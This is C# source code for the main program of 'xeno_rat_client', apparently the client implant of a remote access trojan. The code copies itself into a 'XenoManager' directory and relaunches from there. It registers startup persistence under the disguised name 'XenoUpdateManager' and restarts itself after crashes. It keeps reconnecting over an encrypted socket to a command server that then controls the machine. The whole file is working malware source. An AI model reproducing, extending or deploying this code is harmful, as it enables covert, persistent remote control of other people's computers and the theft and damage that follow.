using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    class Program
    {
        private static Node Server;
        private static DllHandler dllhandler = new DllHandler();
        private static string ServerIp = "localhost";
        private static int ServerPort = 1234;
        private static byte[] EncryptionKey = new byte[32] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
        private static int delay = 1000;
        private static string mutex_string = "testing 123123";
        private static int DoStartup = 2222;
        private static string Install_path = "nothingset";
        private static string startup_name = "nothingset";
        static async Task Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            bool createdNew;
            if (Utils.IsAdmin()) 
            {
                mutex_string = mutex_string + "-admin";
            }
            if (Install_path != "nothingset") 
            {
                try
                {

                    string dir = Environment.ExpandEnvironmentVariables($"%{Install_path}%\\XenoManager\\");
                    if (System.IO.Directory.GetCurrentDirectory() != dir) 
                    {
                        string self = Assembly.GetEntryAssembly().Location;
                        if (!Directory.Exists(dir))
                        {
                            Directory.CreateDirectory(dir);
                        }
                        File.Copy(self, dir + Path.GetFileName(self));
                        Process.Start(dir + Path.GetFileName(self));
                        Environment.Exit(0);
                    }

                }
                catch 
                { 
                    
                }
            }
            Mutex mutex = new Mutex(true, mutex_string, out createdNew);
            if (!createdNew)
            {
                return;
            }
            await Task.Delay(delay);
            if (DoStartup == 1)
            {
                if (startup_name == "nothingset")
                {
                    startup_name = "XenoUpdateManager";
                }
                if (Utils.IsAdmin())
                {
                    await Utils.AddToStartupAdmin(Assembly.GetEntryAssembly().Location, startup_name);
                }
                else 
                {
                    await Utils.AddToStartupNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
                }
                
            }
            while (true)
            {
                try
                {
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    await socket.ConnectAsync(ServerIp, ServerPort);
                    Server = await Utils.ConnectAndSetupAsync(socket, EncryptionKey, 0, 0, OnDisconnect);
                    Handler handle = new Handler(Server, dllhandler);
                    await handle.Type0Receive();
                }
                catch (Exception e)
                {
                    await Task.Delay(10000);
                    Console.WriteLine(e.Message);
                }
            }
        }

        public static void OnDisconnect(Node MainNode) 
        {
            Console.WriteLine(MainNode.Connected());
        }

        static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            Exception exception = e.ExceptionObject as Exception;
            Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
            Process.GetCurrentProcess().Kill();
        }

    }
}
